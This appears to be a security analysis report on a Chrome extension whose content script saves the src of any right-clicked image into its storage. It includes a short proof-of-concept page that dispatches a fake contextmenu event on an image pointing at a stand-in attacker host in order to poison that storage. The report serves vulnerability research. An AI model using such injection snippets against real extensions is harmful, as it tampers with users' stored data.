# CoCo Analysis: chmdbblbhbdlofmbjlgeenhcllnfbcmj

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (document_eventListener_contextmenu → chrome_storage_local_set_sink)

---

## Sink: document_eventListener_contextmenu → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/chmdbblbhbdlofmbjlgeenhcllnfbcmj/opgen_generated_files/cs_0.js
Line 542: document.addEventListener('contextmenu', (event) => {
Line 543: const target = event.target;
Line 547: chrome.runtime.sendMessage({type: 'image', content: img.src});

**Code:**

```javascript
// Content script - DOM event listener (cs_0.js, lines 542-552)
document.addEventListener('contextmenu', (event) => { // ← Attacker can trigger
  const target = event.target; // ← Attacker-controlled event
  if (target.tagName === 'IMG') {
    const img = target;
    if (chrome.runtime && chrome.runtime.sendMessage) {
      chrome.runtime.sendMessage({type: 'image', content: img.src}); // ← Attacker controls img.src
    } else {
      console.error("Failed to send message: chrome.runtime.sendMessage is undefined");
    }
  }
});

// Background script - Message handler (bg.js, lines 1008-1017)
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'text' || message.type === 'image') { // ← Receives attacker data
    chrome.storage.local.get({ clipboardData: [] }, (result) => {
      let clipboardData = result.clipboardData || [];
      if (!isDuplicate(clipboardData, message)) {
        saveToStorage(message); // ← Stores attacker-controlled img.src
      }
    });
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event listener (document.addEventListener)

**Attack:**

```javascript
// Attacker's malicious webpage
// Create a malicious image element with attacker-controlled src
const img = document.createElement('img');
img.src = 'https://attacker.com/malicious-payload.png';
document.body.appendChild(img);

// Trigger contextmenu event on the image
const event = new MouseEvent('contextmenu', {
  bubbles: true,
  cancelable: true,
  view: window
});
img.dispatchEvent(event);

// The extension will capture and store the attacker-controlled img.src value
```

**Impact:** Storage poisoning - The attacker can inject arbitrary image URLs into the extension's clipboard storage by creating malicious image elements on their webpage and dispatching contextmenu events. While storage poisoning alone is limited, the attacker controls what data is stored in the extension's persistent storage. The extension runs on `<all_urls>` per manifest.json, making this exploitable from any malicious website.
